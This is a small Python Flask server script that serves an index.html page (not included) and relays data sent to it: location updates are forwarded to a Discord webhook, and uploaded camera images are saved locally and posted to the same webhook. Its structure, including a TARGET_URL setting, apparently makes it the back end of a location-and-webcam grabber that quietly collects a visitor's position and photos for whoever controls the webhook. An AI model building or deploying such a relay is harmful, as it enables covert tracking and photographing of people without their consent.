from flask import Flask, request, Response
import os
import json
import requests
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

PORT = os.getenv("PORT", 5000)
TARGET_URL = os.getenv("TARGET_URL", "http://localhost")
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')

if not os.path.exists(PATH_TO_IMAGES_DIR):
    os.makedirs(PATH_TO_IMAGES_DIR)

# Utility functions
def get_file_data(file_path):
    with open(file_path, 'r') as open_file:
        return open_file.read()

def update_webhook(webhook_url: str, webhook_data: dict):
    request_payload = json.dumps(webhook_data)
    headers = {'Content-Type': 'application/json'}
    requests.post(webhook_url, headers=headers, data=request_payload)

@app.route("/", methods=["GET"])
def get_website():
    try:
        html_data = get_file_data("index.html")
    except FileNotFoundError:
        html_data = ""
    return Response(html_data, mimetype="text/html")

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    update_webhook(DISCORD_WEBHOOK_URL, data)
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    image_file = request.files['image']
    filename = f'{time.strftime("%Y%m%d-%H%M%S")}.jpeg'
    image_path = os.path.join(PATH_TO_IMAGES_DIR, filename)
    image_file.save(image_path)
    files = {'image': open(image_path, 'rb')}
    response = requests.post(DISCORD_WEBHOOK_URL, files=files)
    return f"{filename} saved and sent to Discord webhook"

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=PORT)